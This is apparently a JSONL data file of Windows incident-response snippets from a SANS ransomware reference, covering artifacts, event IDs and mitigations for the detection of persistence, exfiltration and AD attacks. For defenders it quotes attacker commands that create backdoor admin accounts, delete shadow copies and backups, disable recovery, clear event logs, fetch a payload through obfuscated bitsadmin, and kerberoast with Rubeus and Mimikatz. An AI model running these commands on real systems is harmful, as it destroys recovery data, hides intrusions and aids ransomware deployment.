{"text": "RMM Tool - LogMeIn Log locations (default): %PROGRAMDATA%\\LogMeIn\\LogMeIn.log, %PROGRAMDATA%\\LogMeIn\\LMI[date].log, %PROGRAMFILES(x86)%\\LogMeIn\\journal.dat. Registry key pointing to log file locations: HKLM\\Software\\LogMeIn\\V5\\Log (the 'V5' may be version dependent).", "metadata": {"source": "SANS_Ransomware", "title": "RMM Tool Artifacts - LogMeIn", "category": "dfir", "platform": "windows"}}
{"text": "RMM Tool - Splashtop Log locations: %PROGRAMDATA%\\Splashtop\\Temp\\log\\FTCLog.txt, %PROGRAMFILES(x86)%\\Splashtop\\Splashtop Remote\\Server\\log\\agent_log.txt, %PROGRAMFILES(x86)%\\Splashtop\\Splashtop Remote\\Server\\log\\SPLog.txt. Custom EVTX application providers: Splashtop-Splashtop Streamer-Remote Session/Operational, Splashtop-Splashtop Streamer-Status/Operational.", "metadata": {"source": "SANS_Ransomware", "title": "RMM Tool Artifacts - Splashtop", "category": "dfir", "platform": "windows"}}
{"text": "RMM Tool - TeamViewer Log locations: %PROGRAMFILES%\\TeamViewer\\Connections_incoming.txt, %PROGRAMFILES%\\TeamViewer\\TeamViewer15_Logfile.log, %PROGRAMFILES%\\TeamViewer\\TVNetwork.log, %APPDATA%\\TeamViewer\\TeamViewer15_Logfile.log, %LOCALAPPDATA%\\Temp\\TeamViewer\\TV15Install.log. Note: Some of these log file names will be version-dependent.", "metadata": {"source": "SANS_Ransomware", "title": "RMM Tool Artifacts - TeamViewer", "category": "dfir", "platform": "windows"}}
{"text": "User account creation - Look for commands that can be used to create a new user account. Command Prompt examples: net user SAMAdmim #sorryNOTsorry# /add, net localgroup administrators SAMAdmim /add, net localgroup \"Remote Desktop Users\" SAMAdmim /add", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - User Account Creation CMD", "category": "dfir", "platform": "windows"}}
{"text": "User account creation - PowerShell examples: New-LocalUser -Name \"SAMadmim\" -Password #sorryNOTsorry# -FullName \"SAM Administrator\" -Description \"Admin user\", Add-LocalGroupMember -Groups administrators -Member SAMAdmin, Add-LocalGroupMember -Groups \"Remote Desktop Users\" -Member SAMAdmin", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - User Account Creation PowerShell", "category": "dfir", "platform": "windows"}}
{"text": "User account creation - PowerShell remote examples: Invoke-Command -ComputerName \"samaran-dc.samaranpro.com\" -ScriptBlock{net user SAMAdmin #sorryNOTsorry# /add}, Invoke-Command -ComputerName \"samaran-dc.samaranpro.com\" -ScriptBlock{net localgroup \"Remote Desktop Users\" SAMAdmin /add}", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - User Account Creation Remote", "category": "dfir", "platform": "windows"}}
{"text": "Analyze Windows Event Logs for user account creation: Event ID 4720 - A user account was created. Event ID 4728 - A member was added to a security-enabled global group.", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - User Account Event IDs", "category": "dfir", "platform": "windows"}}
{"text": "Timelining can help you identify when a new account has been used. Check creation timestamps for: The C:\\Users\\[User] directory associated with a TA-created account. The associated NTUSER.DAT registry hive.", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - User Account Timelining", "category": "dfir", "platform": "windows"}}
{"text": "Most common persistence registry keys: [HKCU|HKLM]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, [HKCU|HKLM]\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce, HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx, [HKCU|HKLM]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell", "metadata": {"source": "SANS_Ransomware", "title": "Persistence Registry Keys - Run", "category": "dfir", "platform": "windows"}}
{"text": "Additional persistence registry keys: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit, HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell, HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\*\\MonitorProcess", "metadata": {"source": "SANS_Ransomware", "title": "Persistence Registry Keys - Winlogon", "category": "dfir", "platform": "windows"}}
{"text": "Registry events in Sysmon Event Log: Event ID 12 - RegistryEvent (object create and delete). It monitors changes to Registry autostart locations, or specific malware registry modifications. Event ID 13 - RegistryEvent (Value Set). It identifies Registry value modifications. Event ID 14 - RegistryEvent (key and value rename).", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - Sysmon Registry Events", "category": "dfir", "platform": "windows"}}
{"text": "Services set to autostart: HKLM\\System\\CurrentControlSet\\Services\\*. ImagePath = executable location. Start = 0|1|2 means the service is set to start on boot/login. Malicious ransomware services often run as svchost.exe or services.exe.", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - Services Autostart", "category": "dfir", "platform": "windows"}}
{"text": "Service-related events in System Event Log: Event ID 7034 - Service crashed unexpectedly. Event ID 7035 - Service sent a Start/Stop control. Event ID 7036 - Service started or stopped. Event ID 7040 - Start type changed (Boot | On Request | Disabled). Event ID 7045 - A service was installed on the system (includes failures).", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - System Event Log Service Events", "category": "dfir", "platform": "windows"}}
{"text": "Service-related events in Security Event Log: Event ID 4697 - A service was installed on the system.", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - Security Event Log Service Events", "category": "dfir", "platform": "windows"}}
{"text": "Scheduled tasks can be set to run at login, at a set time, or whenever. Check for scheduled task creation leveraging the %COMSPEC% environment variable: cmd.exe /c schtasks /f /create /ru <task name> /sc ONLOGON /tn \"<task container>\" /tr \"%COMSPEC% /c <file to execute>\"", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - Scheduled Tasks", "category": "dfir", "platform": "windows"}}
{"text": "Evidence of Scheduled Task usage - Security event log: Event ID 4698 - Scheduled task created. Event ID 4702 - Scheduled task updated. Event ID 4699 - Scheduled task deleted. Event ID 4700/4701 - Scheduled task enabled/disabled. Event ID 4648 - Alternate credentials use. Event ID 4672 - Special privileges assigned to new logon.", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - Scheduled Task Security Events", "category": "dfir", "platform": "windows"}}
{"text": "Evidence of Scheduled Task usage - Microsoft-Windows-TaskScheduler\\Operational Event Log: Event ID 106 - Scheduled task created. Event ID 140 - Scheduled task updated. Event ID 141 - Scheduled task deleted. Event ID 200/201 - Scheduled task executed/completed.", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - TaskScheduler Event Log", "category": "dfir", "platform": "windows"}}
{"text": "Tasks cache in the Registry: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks, HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree. Each task will have an associated XML file on disk that defines the task in: C:\\Windows\\System32\\Tasks\\*", "metadata": {"source": "SANS_Ransomware", "title": "Persistence - Scheduled Task Registry and Files", "category": "dfir", "platform": "windows"}}
{"text": "WMI uses filters, consumers, and binders to execute commands given a defined event. Filter: Specifies when the subscription runs. Consumer: Specifies the command to run. Binder: Binds the filter to the consumer to establish a subscription.", "metadata": {"source": "SANS_Ransomware", "title": "WMI Persistence - Overview", "category": "dfir", "platform": "windows"}}
{"text": "Example WMI commands used to detect persistence: wmic /namespace:\\\\root\\subscription PATH __EventFilter get/format:list, wmic /namespace:\\\\root\\subscription PATH __EventConsumer get/format:list, wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding get/format:list", "metadata": {"source": "SANS_Ransomware", "title": "WMI Persistence - Detection Commands", "category": "dfir", "platform": "windows"}}
{"text": "Enable WMI logging in Windows Event Log: wevtutil.exe sl Microsoft-Windows-WMI-Activity/Trace /e:true", "metadata": {"source": "SANS_Ransomware", "title": "WMI Persistence - Enable Logging", "category": "dfir", "platform": "windows"}}
{"text": "WMI persistence artifacts - PowerShell cmdlets to hunt in logs: Get-WmiObject, Remove-WmiObject, Invoke-WmiMethod, Register-WmiEvent, Set-WmiInstance.", "metadata": {"source": "SANS_Ransomware", "title": "WMI Persistence - PowerShell Cmdlets", "category": "dfir", "platform": "windows"}}
{"text": "WMI persistence artifacts - Microsoft-Windows-WMI-Activity\\Operational Windows Event Log: Event ID 5857 - Indicates time of wmiprvse execution and path to provider DLL. Event ID 5860 - Registration of Temporary event consumers. Event ID 5861 - Registration of Permanent event consumers.", "metadata": {"source": "SANS_Ransomware", "title": "WMI Persistence - WMI-Activity Event Log", "category": "dfir", "platform": "windows"}}
{"text": "WMI persistence artifacts - Sysmon Windows Event Log: Event ID 19 - WmiEvent (WmiEventFilter activity detected) - Logs denoting filter registration, including WMI namespace, filter name, and filter expression. Event ID 20 - WmiEvent (WmiEventConsumer activity detected) - Logs denoting consumer registration, including consumer name, log, and destination. Event ID 21 - WmiEvent (WmiEventConsumerToFilter activity detected) - Logs denoting binding of consumer to filter, including consumer name, and filter path.", "metadata": {"source": "SANS_Ransomware", "title": "WMI Persistence - Sysmon Events", "category": "dfir", "platform": "windows"}}
{"text": "Example Commands Used by Ransomware Actors to Enumerate Network Shares - Veil framework: Invoke-ShareFinder -Domain [domain_name].local | Out-File sharefindINFO.txt", "metadata": {"source": "SANS_Ransomware", "title": "Data Access - Share Enumeration Veil", "category": "dfir", "platform": "windows"}}
{"text": "Example Commands Used by Ransomware Actors to Enumerate Network Shares - SharpShares tool: SharpSharesNG.exe shares", "metadata": {"source": "SANS_Ransomware", "title": "Data Access - Share Enumeration SharpShares", "category": "dfir", "platform": "windows"}}
{"text": "LOLBAS method to mount a network share: net use * \"\\\\10.10.15.15\\ExampleShare\" /persistent:no /user:[DOMAIN]\\[Username]", "metadata": {"source": "SANS_Ransomware", "title": "Data Access - Mount Network Share", "category": "dfir", "platform": "windows"}}
{"text": "Detecting File Access and Share Enumeration - Windows Event Logs - Security Provider: Event ID 5140 - A network share object was accessed. Event ID 5145 - A network share object was checked to see whether client can be granted desired access.", "metadata": {"source": "SANS_Ransomware", "title": "Data Access - Share Access Event IDs", "category": "dfir", "platform": "windows"}}
{"text": "Detecting Share Enumeration - Windows Registry: Mapped network drive Most-Recently Used (MRU) items: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU. Mapped network drives (Network Drive Wizard): HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2.", "metadata": {"source": "SANS_Ransomware", "title": "Data Access - Registry Network Drives", "category": "dfir", "platform": "windows"}}
{"text": "Detecting Share Enumeration - Windows Registry: Items typed into the Windows Explorer search box: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths. Items typed into the IE/Edge address bar: HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs. Items typed into the Windows Run dialog by the user: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU.", "metadata": {"source": "SANS_Ransomware", "title": "Data Access - Registry Typed Paths", "category": "dfir", "platform": "windows"}}
{"text": "All open/mapped shares on a system: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Shares", "metadata": {"source": "SANS_Ransomware", "title": "Data Access - Mapped Shares Registry", "category": "dfir", "platform": "windows"}}
{"text": "Detecting Data Staging and Exfiltration - Notepad++ session history: %APPDATA%\\Notepad++\\session.xml", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - Notepad++ Session", "category": "dfir", "platform": "windows"}}
{"text": "Evidence of archive creation - PowerShell Compress-Archive cmdlet example: Compress-Archive -Path C:\\Users\\$dir -DestinationPath C:\\Users\\$dir.zip -CompressionLevel Optimal", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - PowerShell Archive", "category": "dfir", "platform": "windows"}}
{"text": "Evidence of archive creation - Windows native tar command examples: tar -cf <archive> [files], tar -cvzf <archive> [files]", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - Tar Command", "category": "dfir", "platform": "windows"}}
{"text": "Third-party archival tool registry locations: 7-Zip artifacts: HKCU\\Software\\7-Zip\\. WinRAR archive history: HKCU\\Software\\WinRAR\\ArcHistory\\. WinZip archive data: HKCU\\Software\\Nico Mak Computing\\WinZip\\", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - Archive Tool Registry", "category": "dfir", "platform": "windows"}}
{"text": "MFT & UsnJrnl for exfiltration detection: Search for large archives. Search for creation of multiple archives. Search for uncommon archive types and/or names for the environment (e.g., .7z, .rar, etc.). Search for archive tools being brought into the environment.", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - MFT UsnJrnl Analysis", "category": "dfir", "platform": "windows"}}
{"text": "Cloud-based File Sharing exfiltration - Common sites to BLOCK and ALERT upon those not approved in your environment: MEGA, SendSpace, WeTransfer, Google Drive, Dropbox, Box, OneDrive, Amazon Web Services (AWS), Google Cloud Platform (GCP), Azure.", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - Cloud Sharing Sites", "category": "dfir", "platform": "windows"}}
{"text": "Evidence of FTP and SFTP exfiltration: Monitor/hunt TCP ports 20, 21, and 22. Use an approved IP address list and block those not on it.", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - FTP SFTP Ports", "category": "dfir", "platform": "windows"}}
{"text": "WinSCP artifacts - Username & Remote IP address: HKCU\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Configuration\\CDCache. Log File (may or may not exist): HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Logging. Local Directories: HKCU\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Configuration\\History\\LocalTarget. Remote Directories: HKCU\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Configuration\\History\\RemoteTarget.", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - WinSCP Artifacts", "category": "dfir", "platform": "windows"}}
{"text": "FileZilla artifacts: %APPDATA%\\FileZilla\\filezilla.xml, %APPDATA%\\FileZilla\\recentservers.xml, %APPDATA%\\FileZilla\\trustedcerts.xml, %APPDATA%\\FileZilla\\sitemanager.xml, %APPDATA%\\FileZilla\\*.sqlite3", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - FileZilla Artifacts", "category": "dfir", "platform": "windows"}}
{"text": "Rclone potential configuration file locations (depends on version of rclone): Program directory, alongside rclone executable. %APPDATA%/rclone/rclone.conf (Windows only). $XDG_CONFIG_HOME/rclone/rclone.conf. ~/.config/rclone/rclone.conf. ~/.rclone.conf.", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - Rclone Config Locations", "category": "dfir", "platform": "windows"}}
{"text": "Rclone may run for a long time to upload data, which might be identified in Windows Power Efficiency Diagnostics reports: %ProgramData%\\Microsoft\\Windows\\Power Efficiency Diagnostics\\*.[html|xml]", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - Rclone Power Efficiency", "category": "dfir", "platform": "windows"}}
{"text": "MEGAsync (a.k.a., MEGA Desktop App) Executable locations: %LOCALAPPDATA%\\Mega Limited, %LOCALAPPDATA%\\MEGAsync. OriginalFileName: MEGAsync.exe. Scheduled task name: \\MEGA\\MEGAsync Update Task.", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - MEGAsync Executable", "category": "dfir", "platform": "windows"}}
{"text": "MEGAsync artifacts: Configuration file: %LOCALAPPDATA%\\Mega Limited\\MEGAsync\\MEGAsync.cfg. Log files: %LOCALAPPDATA%\\Mega Limited\\MEGAsync\\logs\\. Sync directory registry setting: HKCU\\SOFTWARE\\Classes\\CLSID\\{CLSID of Mega}\\Instance\\InitPropertyBag\\TargetFolderPath.", "metadata": {"source": "SANS_Ransomware", "title": "Data Exfiltration - MEGAsync Artifacts", "category": "dfir", "platform": "windows"}}
{"text": "DO NOT EVER use an adversary's credentials that you might find during IR. The adversary and/or law enforcement may be watching!", "metadata": {"source": "SANS_Ransomware", "title": "IR Warning - Adversary Credentials", "category": "dfir", "platform": "windows"}}
{"text": "Threat Actors often rename executables without changing the file's embedded VERSIONINFO information. Check the OriginalFileName field in Windows Event Log entries - Security Event ID 4688 and/or Sysmon Event ID 1.", "metadata": {"source": "SANS_Ransomware", "title": "Detection Tip - OriginalFileName", "category": "dfir", "platform": "windows"}}
{"text": "Prior to payload deployment, ransomware actors will scan for and identify backup services. Check for well-known open ports: TCP 5000 - Synology, TCP 6106 - Backup Exec, TCP 9392 - Veeam.", "metadata": {"source": "SANS_Ransomware", "title": "Payload Deployment - Backup Service Ports", "category": "dfir", "platform": "windows"}}
{"text": "Ransomware actors destroy backups - Third-party backup services, Volume Shadow Copies. Example commands used to delete shadow copies: vssadmin.exe delete Shadows /all /quiet, wmic shadowcopy delete /nointeractive", "metadata": {"source": "SANS_Ransomware", "title": "Payload Deployment - Delete Shadow Copies", "category": "dfir", "platform": "windows"}}
{"text": "PowerShell commands to delete shadow copies: Get-WmiObject Win32_ShadowCopy | % { $_.Delete() }, Get-WmiObject Win32_ShadowCopy | Remove-WmiObject, Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_Delete(); }, Get-CimInstance Win32_ShadowCopy | Remove-CimInstance", "metadata": {"source": "SANS_Ransomware", "title": "Payload Deployment - PowerShell Shadow Copy Deletion", "category": "dfir", "platform": "windows"}}
{"text": "Ransomware actors disable or modify recovery mechanisms - Boot configuration (bcdedit): bcdedit /set {default} recoveryenabled no, bcdedit /set {default} safeboot minimal. Boot status policy: bcdedit /set {default} bootstatuspolicy ignoreallfailures.", "metadata": {"source": "SANS_Ransomware", "title": "Payload Deployment - Disable Recovery BCDEdit", "category": "dfir", "platform": "windows"}}
{"text": "Ransomware actors disable recovery - Windows backup admin (wbadmin): wbadmin delete backup, wbadmin delete catalog -quiet, wbadmin delete systemstatebackup -keepversions:0", "metadata": {"source": "SANS_Ransomware", "title": "Payload Deployment - WBAdmin Commands", "category": "dfir", "platform": "windows"}}
{"text": "Ransomware actors clear their tracks - Deleting tools and scripts. Clearing event logs. Security Event Log: Event ID 1102 - The audit log was cleared.", "metadata": {"source": "SANS_Ransomware", "title": "Payload Deployment - Clear Tracks", "category": "dfir", "platform": "windows"}}
{"text": "Example PowerShell command to clear event logs: Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }. Example to clear event logs using wevtutil.exe: Get-WinEvent -ListLog * -Force | % { Wevtutil.exe cl $_.LogName }", "metadata": {"source": "SANS_Ransomware", "title": "Payload Deployment - Clear Event Logs", "category": "dfir", "platform": "windows"}}
{"text": "Ransomware actors prevent IR by: Disabling RDP/Terminal Services. Blocking inbound connectivity via the Windows Firewall.", "metadata": {"source": "SANS_Ransomware", "title": "Payload Deployment - Prevent IR", "category": "dfir", "platform": "windows"}}
{"text": "Secure and monitor backup servers, and store backups offsite.", "metadata": {"source": "SANS_Ransomware", "title": "Recommendation - Backup Security", "category": "dfir", "platform": "windows"}}
{"text": "Payload deployment via PsExec often relies on the tool's @file parameter, which designates a file that contains host names or IPs on each line. Example command: psexec.exe -accepteula @C:\\Windows\\Temp\\trgt.txt -u user -p password cmd /c copy \"\\\\127.0.0.1\\c$\\Windows\\Temp\\x.exe\" \"C:\\Windows\\Temp\"", "metadata": {"source": "SANS_Ransomware", "title": "Payload Deployment - PsExec with File List", "category": "dfir", "platform": "windows"}}
{"text": "BITS is a protocol to upload/download files via HTTP/SMB, which factors in bandwidth availability and scales traffic use. It is able to handle network interruptions to pause and resume processes, even after reboot. BITSAdmin tool: bitsadmin.exe. Check whether and how often BITSAdmin should be running in your environment, and ALERT as appropriate.", "metadata": {"source": "SANS_Ransomware", "title": "BITS Deployment - Overview", "category": "dfir", "platform": "windows"}}
{"text": "Examples of BITS-based file transfers - File transfer: bitsadmin.exe /transfer update /download /priority normal \\\\[Your_DC]\\c$\\update.exe C:\\update.exe", "metadata": {"source": "SANS_Ransomware", "title": "BITS Deployment - File Transfer", "category": "dfir", "platform": "windows"}}
{"text": "Examples of BITS-based file transfers - File download: %COMSPEC% /c c^m^d.e^x^e /c BiTsAdmIN /transfer UpdateUI /download /priority normal https://1.2.3.4/system.dll C:\\Microsoft\\sys.dll", "metadata": {"source": "SANS_Ransomware", "title": "BITS Deployment - File Download Obfuscated", "category": "dfir", "platform": "windows"}}
{"text": "Examples of BITS-based file transfers - Using WMIC to copy a file: start wmic /node:@\\\\127.0.0.1\\scanned.txt /user: \"user\" /password: \"password\" process call create \"cmd.exe /c bitsadmin /transfer SafeUpdate \\\\samaran-dc\\c$\\SafeMen.exe %APPDATA%\\SafeMen.exe && %APPDATA%\\SafeMen.exe\"", "metadata": {"source": "SANS_Ransomware", "title": "BITS Deployment - WMIC Copy", "category": "dfir", "platform": "windows"}}
{"text": "BITS PowerShell cmdlets: Add-BitsFile - Adds files to a BITS transfer. Complete-BitsTransfer - Completes a BITS transfer. Get-BitsTransfer - Gets a BITS transfer. Remove-BitsTransfer - Stops a BITS transfer. Resume-BitsTransfer - Resumes a suspended BITS transfer. Set-BitsTransfer - Configures a BITS transfer job. Start-BitsTransfer - Creates and starts a BITS transfer job. Suspend-BitsTransfer - Pauses a BITS transfer job.", "metadata": {"source": "SANS_Ransomware", "title": "BITS Deployment - PowerShell Cmdlets", "category": "dfir", "platform": "windows"}}
{"text": "Detecting BITS file transfers - Microsoft-Windows-Bits-Client\\Operational.evtx Windows Event Log: Event ID 60 - BITS has stopped transferring.", "metadata": {"source": "SANS_Ransomware", "title": "BITS Detection - Bits-Client Event Log", "category": "dfir", "platform": "windows"}}
{"text": "Detecting BITS file transfers - Security Windows Event Log (bitsadmin.exe): Event ID 4688 - A new process has been created. Event ID 4689 - A process has exited.", "metadata": {"source": "SANS_Ransomware", "title": "BITS Detection - Security Event Log", "category": "dfir", "platform": "windows"}}
{"text": "Detecting BITS file transfers - Sysmon Windows Event Log (bitsadmin.exe): Event ID 1 - Process creation. Event ID 5 - Process terminated.", "metadata": {"source": "SANS_Ransomware", "title": "BITS Detection - Sysmon Event Log", "category": "dfir", "platform": "windows"}}
{"text": "Detecting BITS file transfers - System Windows Event Log (Background Intelligence Transfer Service): Event ID 7036 - A service changed state.", "metadata": {"source": "SANS_Ransomware", "title": "BITS Detection - System Event Log", "category": "dfir", "platform": "windows"}}
{"text": "Detecting BITS file transfers - Temporary files named BITFxxxx.tmp on the system. Sysmon Event ID 11 - File Create (BITFxxxx.tmp).", "metadata": {"source": "SANS_Ransomware", "title": "BITS Detection - Temp Files", "category": "dfir", "platform": "windows"}}
{"text": "The Event IDs in this section are not enabled by default on your Domain Controllers (DCs). Enabling them on your DCs may be quite noisy. Try to filter logging for specific ticket options as denoted in the Detection sections.", "metadata": {"source": "SANS_Ransomware", "title": "AD Attacks - Event ID Note", "category": "dfir", "platform": "windows"}}
{"text": "Common enumeration tools - Nltest example commands: nltest /dclist:, nltest /domain_trusts /all_trusts", "metadata": {"source": "SANS_Ransomware", "title": "AD Enumeration - Nltest", "category": "dfir", "platform": "windows"}}
{"text": "Common enumeration tools - Adfind example commands: adfind.exe -f \"(objectcategory=person)\", adfind.exe -f \"(objectcategory=organizationalUnit)\"", "metadata": {"source": "SANS_Ransomware", "title": "AD Enumeration - AdFind", "category": "dfir", "platform": "windows"}}
{"text": "Common enumeration tools - Bloodhound/SharpHound example command: SharpHound.exe --ldapusername samadmin --ldappassword Passw0rd012345 --domain samaranpro.com", "metadata": {"source": "SANS_Ransomware", "title": "AD Enumeration - BloodHound", "category": "dfir", "platform": "windows"}}
{"text": "Kerberoasting Detection - Monitor Event ID 4769: A Kerberos service ticket was requested. Review the Ticket Options in this event for: Ticket Options: 0x40810000, Ticket Encryption: 0x17. The Ticket Encryption value of 0x17 references a ticket that is encrypted using the RC4 algorithm.", "metadata": {"source": "SANS_Ransomware", "title": "AD Attacks - Kerberoasting Detection", "category": "dfir", "platform": "windows"}}
{"text": "Kerberoasting Detection - Alert on Mimikatz and/or Rubeus use. Example commands: mimikatz kerberos::list /export, rubeus.exe kerberoast /domain:fakedomain.com. Alert on *.kirbi file creation, which is used by Mimikatz.", "metadata": {"source": "SANS_Ransomware", "title": "AD Attacks - Kerberoasting Tools", "category": "dfir", "platform": "windows"}}
{"text": "Kerberoasting Mitigation: Find vulnerable accounts using: Get-ADUser -filter * -properties ServicePrincipalName | Select SamAccountName, ServicePrincipalName | where {$_.ServicePrincipalName -ne $null} | fl. Remove SPNs from accounts where possible. Where not possible, implement non-crackable passwords (long, high-entropy passwords).", "metadata": {"source": "SANS_Ransomware", "title": "AD Attacks - Kerberoasting Mitigation", "category": "dfir", "platform": "windows"}}
{"text": "Kerberoasting Mitigation: Look into using Managed Service Accounts (MSAs). Disable the use of RC4 for Kerberos tickets.", "metadata": {"source": "SANS_Ransomware", "title": "AD Attacks - Kerberoasting Additional Mitigation", "category": "dfir", "platform": "windows"}}
{"text": "AS-REP Roasting Detection - Monitor Event ID 4768: A Kerberos authentication ticket (TGT) was requested. Review the Additional Information in this event for: Pre-Authentication: 0.", "metadata": {"source": "SANS_Ransomware", "title": "AD Attacks - AS-REP Roasting Detection", "category": "dfir", "platform": "windows"}}
{"text": "AS-REP Roasting Detection - Alert on Mimikatz and/or Rubeus use. Example command: rubeus.exe asreproast", "metadata": {"source": "SANS_Ransomware", "title": "AD Attacks - AS-REP Roasting Tools", "category": "dfir", "platform": "windows"}}
{"text": "AS-REP Roasting Mitigation - Find vulnerable accounts using: Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name. Enable Pre-Authentication on any identified accounts where possible. Where not possible, implement non-crackable passwords (long, high-entropy passwords).", "metadata": {"source": "SANS_Ransomware", "title": "AD Attacks - AS-REP Roasting Mitigation", "category": "dfir", "platform": "windows"}}
